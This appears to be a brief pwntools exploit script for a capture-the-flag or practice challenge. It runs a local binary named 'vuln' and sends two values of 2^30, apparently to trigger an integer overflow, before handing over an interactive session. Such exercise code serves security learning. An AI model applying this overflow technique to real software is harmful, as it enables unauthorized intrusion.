from pwn import *

io = process('./vuln')
#io = remote()

io.recvuntil(b'possible:')
io.sendline(b'1073741824\n1073741824')
io.interactive()